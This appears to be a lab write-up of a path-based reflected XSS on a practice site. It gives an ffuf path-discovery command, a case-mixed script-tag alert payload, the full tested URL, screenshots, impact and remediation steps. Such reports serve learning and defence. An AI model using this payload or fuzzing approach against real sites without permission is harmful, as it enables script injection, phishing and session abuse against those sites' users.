## Title
Reflected XSS - Path Based

## Description

**Affected URL:** https://path-fetch.pwnedbox.site/

The application is vulnerable to Reflected Cross-Site Scripting (XSS) through URL path manipulation. User-controlled path content is reflected into the application response without proper output encoding, allowing injected JavaScript to execute when the crafted URL is opened.

## Steps to Reproduce

1. Run FFUF to identify accessible paths using the wordlist.
2. Identify the `admin%20` path returning HTTP 200.
3. Append the XSS payload to the discovered path and open the crafted URL.
4. Observe the browser alert displaying `XSS`.

## POC (Proof of Concept)

**Lab Address:** https://path-fetch.pwnedbox.site/

**HTTP Method:** GET

**Discovery Command:**
```bash
ffuf -u https://path-fetch.pwnedbox.site/FUZZ \
-w ~/BugBounty/Wordlists/all.txt \
-ac
```

**Discovered Path:**
```text
admin%20
```

**Payload:**
```html
"mihir"><><ScRiPt>alert('XSS')</ScRiPt>
```

**Tested URL:**
```text
https://path-fetch.pwnedbox.site/admin%20"mihir"><><ScRiPt>alert('XSS')</ScRiPt>
```

**Observed Result:**

The application reflects the injected path content, and the browser executes the JavaScript, displaying an alert containing `XSS`. This confirms reflected XSS through the URL path.

**Screenshot Evidence:**
1. FFUF output showing the discovered `admin%20` path with HTTP 200.
<img width="1919" height="767" alt="image" src="https://github.com/user-attachments/assets/79b276d5-863b-4ac9-8aec-1a5474fa1a7f" />

2. Crafted URL containing the XSS payload.
<img width="1914" height="962" alt="image" src="https://github.com/user-attachments/assets/7fad9d6d-47fc-4064-9f00-3f8ad979f530" />

3. Browser alert displaying `XSS`.
<img width="1906" height="970" alt="image" src="https://github.com/user-attachments/assets/b1b09a7c-cd40-4218-9aab-b347653606fa" />


## Impact

An attacker could create a malicious URL and trick a victim into opening it. Successful exploitation may allow:

- JavaScript execution in the victim's browser.
- Display of fake login forms or phishing content.
- Unauthorized actions within the victim's session, depending on application protections.

## Remediation

1. Apply context-aware output encoding to user-controlled URL path content.
2. Validate and safely handle URL path segments.
3. Never insert untrusted input directly into HTML.
4. Implement a restrictive Content Security Policy (CSP).
